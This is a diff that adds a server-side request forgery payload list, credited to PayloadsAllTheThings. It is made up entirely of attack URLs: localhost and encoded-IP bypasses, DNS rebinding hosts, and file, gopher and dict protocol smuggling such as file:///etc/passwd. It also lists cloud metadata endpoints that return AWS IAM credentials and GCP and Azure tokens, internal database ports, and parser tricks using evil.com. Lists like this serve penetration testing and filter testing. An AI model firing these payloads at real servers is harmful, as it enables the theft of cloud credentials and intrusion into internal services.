@@ -1,0 +1,90 @@
+# SSRF (Server-Side Request Forgery) Payloads
+# Source: PayloadsAllTheThings
+
+# Localhost Bypass
+http://127.0.0.1
+http://localhost
+http://127.0.0.1:80
+http://127.0.0.1:443
+http://127.0.0.1:22
+http://127.1
+http://0.0.0.0
+http://0
+http://[::1]
+http://[0:0:0:0:0:0:0:1]
+http://localhost:80
+http://localhost:443
+
+# Decimal IP
+http://2130706433 (127.0.0.1)
+http://3232235521 (192.168.0.1)
+http://3232235777 (192.168.1.1)
+http://2852039166 (169.254.169.254)
+
+# Octal IP
+http://0177.0.0.1 (127.0.0.1)
+http://0x7f.0.0.1 (127.0.0.1)
+
+# URL Encoding
+http://127.0.0.1%2580
+http://%31%32%37%2e%30%2e%30%2e%31
+
+# DNS Rebinding
+http://localtest.me
+http://127.0.0.1.nip.io
+http://customer1.app.localhost.my.company.127.0.0.1.nip.io
+
+# Protocol Smuggling
+file:///etc/passwd
+dict://localhost:11211/info
+gopher://localhost:25/xHELO%20localhost
+ftp://localhost
+
+# AWS Metadata
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://169.254.169.254/latest/user-data/
+http://169.254.169.254/latest/meta-data/hostname
+http://169.254.169.254/latest/meta-data/public-ipv4
+http://169.254.169.254/latest/meta-data/public-keys/
+http://169.254.169.254/latest/dynamic/instance-identity/document
+
+# GCP Metadata
+http://metadata.google.internal/computeMetadata/v1/
+http://metadata.google.internal/computeMetadata/v1/project/
+http://metadata.google.internal/computeMetadata/v1/instance/
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+
+# Azure Metadata
+http://169.254.169.254/metadata/instance?api-version=2021-02-01
+http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01
+
+# DigitalOcean Metadata
+http://169.254.169.254/metadata/v1/
+http://169.254.169.254/metadata/v1/id
+http://169.254.169.254/metadata/v1/hostname
+
+# Kubernetes
+https://kubernetes.default.svc
+https://kubernetes.default
+http://10.0.0.1
+
+# Internal Services
+http://localhost:6379 (Redis)
+http://localhost:11211 (Memcached)
+http://localhost:3306 (MySQL)
+http://localhost:5432 (PostgreSQL)
+http://localhost:27017 (MongoDB)
+http://localhost:9200 (Elasticsearch)
+http://localhost:8080 (Common web)
+http://localhost:8000 (Django dev)
+http://localhost:5000 (Flask dev)
+http://localhost:3000 (Node.js)
+
+# Bypass Techniques
+http://127.0.0.1#@evil.com
+http://evil.com#@127.0.0.1
+http://127.0.0.1?@evil.com
+http://127.0.0.1\@evil.com
+http://127.0.0.1%23@evil.com
+http://127。0。0。1 (Unicode)
